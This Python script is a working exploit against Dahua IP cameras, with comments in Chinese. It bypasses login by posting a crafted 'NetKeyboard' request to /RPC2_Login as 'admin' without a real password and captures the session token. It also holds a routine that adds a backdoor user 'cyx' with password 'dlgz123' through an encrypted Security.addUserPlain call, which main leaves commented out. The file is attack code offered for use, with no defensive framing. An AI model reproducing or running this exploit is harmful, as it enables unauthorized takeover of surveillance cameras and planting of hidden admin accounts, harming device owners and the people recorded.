from typing import Union
import httpx
import urllib3
from utils.log import logger
urllib3.disable_warnings()


class Payload(object):
    def __init__(self, ip) -> None:
        self.ip = ip
        self.addr = f"http://{self.ip}"
        header = {"Accept": "application/json, text/javascript, */*; q=0.01", "X-Requested-With": "XMLHttpRequest", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
                  "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin":  self.addr+"/", "Referer":  self.addr+"/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}

        self.session = httpx.Client(headers=header, verify=False, timeout=5)
        self.token = None

    def get_token(self) -> Union[bool, str]:
        """获取 token"""
        url = self.addr+"/RPC2_Login"
        post_json = {"id": 1, "method": "global.login", "params": {"authorityType": "Default", "clientType": "NetKeyboard",
                                                                   "loginType": "Direct", "password": "Not Used", "passwordType": "Default", "userName": "admin"}, "session": 0}
        r = self.session.post(url, json=post_json)
        if r.status_code != 200:
            logger.info(f"[-] 大华摄像头 token 获取失败 请求码:{r.status_code}")
            return False
        r = r.json()
        if 'True' in str(r):
            self.token = r["session"]

            logger.success(f"[+] {self.ip} 大华摄像头 token 获取成功 {self.token}")
            self.session.cookies["DWebClientSessionID"] = self.token
            return self.token
        else:
            logger.info(f"[-] 大华摄像头 token 获取失败")
            return False

    def login(self):
        """通过获取的 token 进行登录"""
        print(self.session.cookies)
        # resp = self.session.get(self.addr)
        # print(resp.cookies)
        # print(resp.text)

    def add_user(self):
        """添加一个用户 cyx/dlgz123"""
        url = f"{self.addr}/RPC2"
        json_data = {"method": "Security.addUserPlain", "params": {"salt": "aac39c190f37434e69aac7fbf74cd8554cdf29b11e83ae62854dc27b0a00e404ad2760e09ad7fd61dd41fd11de844484ea8c1ac603d861b4ce37364f10c775811f68fc67e731530acf29c009c1a45b81abf2abe93c47be8ef582ec64c180659e13c2cda9da9b8f86c062b7ca57ff9458c0baff1d67bc2b78678fa94fbc3b1ab71be0705f6201b26b1ba2cae4d4c807f69da6d15d4e44b65ab5e8797a0c694d22a409da2611324a0fc6dc738878b53d33caff8a2b40a13bc2fc4a358edf702d727a3294933448b622437223a244e1df05b07c9f8442e90186ce8a72dc218eb5adf46f0fc9147e6f8995d56e0a7462d88e056193eb114bbd22a23280ff882fb067",
                                                                   "cipher": "RPAC-256", "content": "LhckUxAKFI7jFyC5LHBmbrzQLYRn31LSqiXB2JGt2RZ2lqX9kvUh8OxuyrXiXDi36Gbcva+P98/4qtfMRcD3t2DTa2wNRPYUKvMsVb4vu75foSBhT/XI3kzoUDIHWwd1uAbSxkHK1Y90sBnRkl2ORSjhPFP12JFgtcKeqVOR+MbZbwb4wiqb0OFX5TqKdqDmcRxBg8L9JU4BML2R+AlMhlBJMVz0J4mfu94Qw9ibVNSSp9sn1IMWpp01G/U7jAsTXhJgvG3T3c5Te7doAx55EBQ4OSS8M1lcDdmQU9/FYV3Cz9ZhJ+nqAqkZOgvVl+SVQ9IMeWh6NBqclBmgDCGPKcPIy6J+QMHCEpmkMEtAa1ULMlbW8uBKZSyPXr+eOIZXQfwEbL4URSowcZmuKwWw2vGb70wSebGzekHSX2YwtWEYHORgD/TtHyYI+QsR2uqIzncgW4HQX5WDN+hlcBx8kXevUrkUELcsg359Q0luavQ="}, "id": 356, "session": self.token}
        resp = self.session.post(url=url, json=json_data)
        print(self.session.cookies)
        print(resp.json())

    def login_test(self):
        url = f"{self.addr}/RPC2"
        json_data = {"method": "system.listMethod",
                     "params": "null", "id": 5, "session": self.token
                     }
        resp = self.session.post(url=url, json=json_data)
        print(self.session.cookies)
        print(resp.json())

    def main(self):
        if self.get_token():
            self.login()
            # self.add_user()
            self.login_test()


if __name__ == "__main__":
    camera = Payload("10.4.95.12")
    camera.main()
